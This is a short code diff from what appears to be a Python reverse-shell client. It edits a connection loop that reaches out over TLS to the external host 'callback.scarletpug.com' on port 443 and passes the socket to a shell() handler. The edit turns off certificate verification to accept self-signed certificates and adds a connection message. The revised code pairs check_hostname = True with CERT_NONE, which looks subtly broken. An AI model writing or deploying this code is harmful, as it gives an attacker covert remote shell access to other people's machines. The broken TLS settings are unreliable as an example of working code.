@@ -227,17 +227,16 @@ def connection():
     host = 'callback.scarletpug.com'
     port = 443
 
-    context = ssl._create_unverified_context()  # <== allows self-signed or unknown CA
-    # Alternatively:
-    # context = ssl.create_default_context()
-    # context.check_hostname = False
-    # context.verify_mode = ssl.CERT_NONE
+    context = ssl.create_default_context()
+    context.check_hostname = True
+    context.verify_mode = ssl.CERT_NONE  # <- Accept self-signed certs, avoid handshake errors
 
     while True:
         try:
-            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw_socket = socket.create_connection((host, port))
             s = context.wrap_socket(raw_socket, server_hostname=host)
-            s.connect((host, port))
+
+            print("[+] Connected to server over TLS")
             shell(s)
             s.close()
             break
